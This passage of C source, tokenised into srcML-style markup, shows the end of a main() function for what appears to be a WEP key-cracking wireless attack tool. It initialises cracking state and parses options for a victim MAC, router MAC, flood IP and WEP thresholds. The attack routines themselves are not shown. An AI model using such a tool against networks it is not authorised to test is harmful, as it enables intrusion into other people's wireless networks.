name|perror
argument_list|(
literal|"gettimeofday()"
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|1
argument_list|)
expr_stmt|;
block|}
name|chaninfo
operator|.
name|s
operator|=
operator|-
literal|1
expr_stmt|;
name|victim
operator|.
name|ssid
operator|=
literal|0
expr_stmt|;
name|prgainfo
operator|.
name|len
operator|=
literal|0
expr_stmt|;
name|memset
argument_list|(
operator|&
name|txstate
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|txstate
argument_list|)
argument_list|)
expr_stmt|;
name|memset
argument_list|(
operator|&
name|fragstate
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|fragstate
argument_list|)
argument_list|)
expr_stmt|;
name|memset
argument_list|(
operator|&
name|decryptstate
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|decryptstate
argument_list|)
argument_list|)
expr_stmt|;
name|memset
argument_list|(
operator|&
name|weplog
argument_list|,
literal|0
argument_list|,
sizeof|sizeof
argument_list|(
name|weplog
argument_list|)
argument_list|)
expr_stmt|;
name|state
operator|=
name|FIND_VICTIM
expr_stmt|;
while|while
condition|(
operator|(
name|ch
operator|=
name|getopt
argument_list|(
name|argc
argument_list|,
name|argv
argument_list|,
literal|"hi:s:m:r:a:n:cp:4v:t:f:"
argument_list|)
operator|)
operator|!=
operator|-
literal|1
condition|)
block|{
switch|switch
condition|(
name|ch
condition|)
block|{
case|case
literal|'a'
case|:
name|str2mac
argument_list|(
name|mymac
argument_list|,
name|optarg
argument_list|)
expr_stmt|;
break|break;
case|case
literal|'s'
case|:
name|floodip
operator|=
name|optarg
expr_stmt|;
break|break;
case|case
literal|'i'
case|:
name|dev
operator|=
name|optarg
expr_stmt|;
break|break;
case|case
literal|'m'
case|:
name|strncpy
argument_list|(
name|myip
argument_list|,
name|optarg
argument_list|,
sizeof|sizeof
argument_list|(
name|myip
argument_list|)
operator|-
literal|1
argument_list|)
expr_stmt|;
name|myip
index|[
sizeof|sizeof
argument_list|(
name|myip
argument_list|)
operator|-
literal|1
index|]
operator|=
literal|0
expr_stmt|;
break|break;
case|case
literal|'n'
case|:
name|netip
operator|=
name|optarg
expr_stmt|;
name|netip_arg
operator|=
literal|1
expr_stmt|;
break|break;
case|case
literal|'r'
case|:
name|str2mac
argument_list|(
name|rtr
argument_list|,
name|optarg
argument_list|)
expr_stmt|;
name|rtrmac
operator|=
name|rtr
expr_stmt|;
break|break;
case|case
literal|'v'
case|:
name|str2mac
argument_list|(
name|vic
argument_list|,
name|optarg
argument_list|)
expr_stmt|;
name|victim_mac
operator|=
name|vic
expr_stmt|;
break|break;
case|case
literal|'c'
case|:
name|wep_thresh
operator|=
operator|-
literal|1
expr_stmt|;
break|break;
case|case
literal|'p'
case|:
name|min_prga
operator|=
name|atoi
argument_list|(
name|optarg
argument_list|)
expr_stmt|;
break|break;
case|case
literal|'t'
case|:
name|thresh_incr
operator|=
name|wep_thresh
operator|=
name|atoi
argument_list|(
name|optarg
argument_list|)
expr_stmt|;
break|break;
case|case
literal|'f'
case|:
name|max_chan
operator|=
name|atoi
argument_list|(
name|optarg
argument_list|)
expr_stmt|;
break|break;
case|case
literal|'4'
case|:
name|bits
operator|=
literal|64
expr_stmt|;
break|break;
default|default:
name|usage
argument_list|(
name|argv
index|[
literal|0
index|]
argument_list|)
expr_stmt|;
break|break;
block|}
block|}
name|start
argument_list|(
name|dev
argument_list|)
expr_stmt|;
if|if
condition|(
name|chaninfo
operator|.
name|s
operator|!=
operator|-
literal|1
condition|)
name|close
argument_list|(
name|chaninfo
operator|.
name|s
argument_list|)
expr_stmt|;
if|if
condition|(
name|victim
operator|.
name|ssid
condition|)
name|free
argument_list|(
name|victim
operator|.
name|ssid
argument_list|)
expr_stmt|;
name|exit
argument_list|(
literal|0
argument_list|)
expr_stmt|;
block|}
end_function

end_unit

